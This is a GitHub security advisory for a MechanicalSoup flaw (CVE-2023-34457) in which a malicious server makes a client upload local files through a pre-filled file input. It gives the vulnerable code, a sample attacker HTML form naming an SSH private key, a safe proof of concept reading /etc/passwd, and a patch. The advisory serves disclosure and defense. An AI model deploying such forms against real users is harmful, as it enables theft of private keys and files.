# [H] MechanicalSoup vulnerable to malicious web server reading arbitrary files on client using file input inside HTML form

## Summary
Severity: High
Advisory: GHSA-x456-3ccm-m6j4
CVE: CVE-2023-34457
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2023-07-05
Source: https://github.com/advisories/GHSA-x456-3ccm-m6j4
Type: github-advisory

## Affected
- PyPI: `MechanicalSoup` — affected >=0.2.0 <1.3.0

## Details
### Summary
A malicious web server can read arbitrary files on the client using a `<input type="file" ...>` inside HTML form.

### Details
This affects the extremely common pattern of form submission:

```python
b = mechanicalsoup.StatefulBrowser()
b.select_form(...)
b.submit_selected()
```

The problem is with the code in `browser.Browser.get_request_kwargs`:

```python
    if tag.get("type", "").lower() == "file" and multipart:
        filepath = value
        if filepath != "" and isinstance(filepath, str):
            content = open(filepath, "rb")
        else:
            content = ""
        filename = os.path.basename(filepath)
        # If value is the empty string, we still pass it
        # for consistency with browsers (see
        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
        files[name] = (filename, content)
```

The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:

```html
<html><body>
  <form method="post" enctype="multipart/form-data">
    <input type="text" name="greeting" value="hello" />
    <input type="file" name="evil" value="/home/user/.ssh/id_rsa" />
  </form>
</body></html>
```

then upon `.submit_selected()` the mechanicalsoup browser will happily send over the contents of your SSH private key.

### PoC

```python
import attr
import mechanicalsoup
import requests


class NevermindError(Exception):
    pass


@attr.s
class FakeSession:
    session = attr.ib()

    headers = property(lambda self: self.session.headers)

    def request(self, *args, **kwargs):
        print("requested", args, kwargs)
        raise NevermindError  # don't actually send request


def demonstrate(inputs=None):
    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
    b.open_fake_page("""\
<html><body>
<form method="post" enctype="multipart/form-data">
<input type="text" name="greeting" value="hello" />
<input type="file" name="evil" value="/etc/passwd" />
<input type="file" name="second" />
</form>
</body></html>
""", url="http://127.0.0.1:9/")
    b.select_form()
    if inputs is not None:
        b.form.set_input(inputs)
    try:
        b.submit_selected()
    except NevermindError:
        pass

# %%

# unpatched
demonstrate()
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', <_io.BufferedReader name='/etc/passwd'>), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}

# %%

# with the patch, this now works. users MUST open the file manually and
# use browser.set_input() using the file object.
demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', <_io.BufferedReader name='/etc/hostname'>), 'second': ('null', <_io.BufferedReader name='/dev/null'>)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}

# %%

# with the patch, this raises a ValueError with a helpful string
demonstrate({"evil": "/etc/hostname"})

# %%

# with the patch, we silently send no file if a malicious server tries the attack:
demonstrate()
```

### Suggested patch

```diff
diff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py
index 285f8bb..68bc65e 100644
--- a/mechanicalsoup/browser.py
+++ b/mechanicalsoup/browser.py
@@ -1,7 +1,8 @@
+import io
 import os
 import tempfile
 import urllib
 import weakref
 import webbrowser
 
 import bs4
@@ -227,15 +228,21 @@ class Browser:
                     value = tag.get("value", "")
 
                 # If the enctype is not multipart, the filename is put in
                 # the form as a text input and the file is not sent.
                 if tag.get("type", "").lower() == "file" and multipart:
                     filepath = value
                     if filepath != "" and isinstance(filepath, str):
-                        content = open(filepath, "rb")
+                        content = getattr(tag, "_mechanicalsoup_file", None)
+                        if content is False:
+                            raise ValueError(
+                                """From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({"name": open("/path/to/filename", "rb")})`. This change is to mitigate a security vulnerability where a malicious web server could read arbitrary files from the client."""
+                            )
+                        elif not isinstance(content, io.IOBase):
+                            content = ""
                     else:
                         content = ""
                     filename = os.path.basename(filepath)
                     # If value is the empty string, we still pass it
                     # for consistency with browsers (see
                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
                     files[name] = (filename, content)
diff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py
index a67195c..82f6015 100644
--- a/mechanicalsoup/form.py
+++ b/mechanicalsoup/form.py
@@ -1,8 +1,9 @@
 import copy
+import io
 import warnings
 
 from bs4 import BeautifulSoup
 
 from .utils import LinkNotFoundError
 
 
@@ -64,15 +65,24 @@ class Form:
         give it the value ``password``.
         """
 
         for (name, value) in data.items():
             i = self.form.find("input", {"name": name})
             if not i:
                 raise InvalidFormMethod("No input field named " + name)
-            i["value"] = value
+
+            if isinstance(value, io.IOBase):
+                # Store the actual file object for <input type="file">
+                i._mechanicalsoup_file = value
+                i["value"] = value.name
+            else:
+                # We set `_mechanicalsoup_file` to `False` so that we can
+                # check for deprecated use of the API.
+                i._mechanicalsoup_file = False
+                i["value"] = value
 
     def uncheck_all(self, name):
         """Remove the *checked*-attribute of all input elements with
         a *name*-attribute given by ``name``.
         """
         for option in self.form.find_all("input", {"name": name}):
             if "checked" in option.attrs:
@@ -257,20 +267,20 @@ class Form:
         .. code-block:: python
 
             form.set("login", username)
             form.set("password", password)
             form.set("eula-checkbox", True)
 
         Example: uploading a file through a ``<input type="file"
-        name="tagname">`` field (provide the path to the local file,
+        name="tagname">`` field (provide an open file object,
         and its content will be uploaded):
 
         .. code-block:: python
 
-            form.set("tagname", path_to_local_file)
+            form.set("tagname", open(path_to_local_file, "rb"))
 
         """
         for func in ("checkbox", "radio", "input", "textarea", "select"):
             try:
                 getattr(self, "set_" + func)({name: value})
                 return
             except InvalidFormMethod:
```

### Impact

All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.

## References
- https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4
- https://nvd.nist.gov/vuln/detail/CVE-2023-34457
- https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e
- https://github.com/MechanicalSoup/MechanicalSoup
- https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0
- https://github.com/pypa/advisory-database/tree/main/vulns/mechanicalsoup/PYSEC-2023-108.yaml
